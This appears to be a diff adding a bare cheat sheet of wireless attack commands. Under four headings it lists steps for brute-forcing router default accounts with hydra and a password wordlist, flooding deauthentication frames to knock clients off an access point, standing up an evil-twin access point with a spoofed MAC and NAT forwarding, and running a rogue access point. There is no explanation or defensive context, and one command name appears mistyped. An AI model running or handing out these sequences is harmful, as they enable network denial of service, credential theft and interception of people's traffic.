@@ -1,0 +1,30 @@
+Cracking Default Accounts on the Access Points
+    map -p 80 --script http-default-accounts [router IP]
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt [router IP] http-get /
+
+Deauthentication DoS Attack
+    airmon-ng start wlan0
+    airodump-ng mon0
+    aireplay-ng --deauth 1000 -a [target AP MAC] mon0
+
+Evil Twin with MAC Spoofing
+    airmon-ng start wlan0
+    airodump-ng mon0
+    macchanger --mac [spoofed MAC] wlan0
+    airbase-ng -e [ESSID] -c [channel] -a [spoofed MAC] mon0
+    ifconfig at0 up
+    dhcpd at0
+    ifconfig at0 192.168.10.1 netmask 255.255.255.0
+    iptables --flush
+    iptables --table nat --flush
+    iptables --delete-chain
+    iptables --table nat --delete-chain
+    iptables -P FORWARD ACCEPT
+    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Rogue Access Point
+    airmon-ng start wlan0
+    airbase-ng -e RogueAP -c [channel] mon0
+    ifconfig at0 up
+    dhclient at0
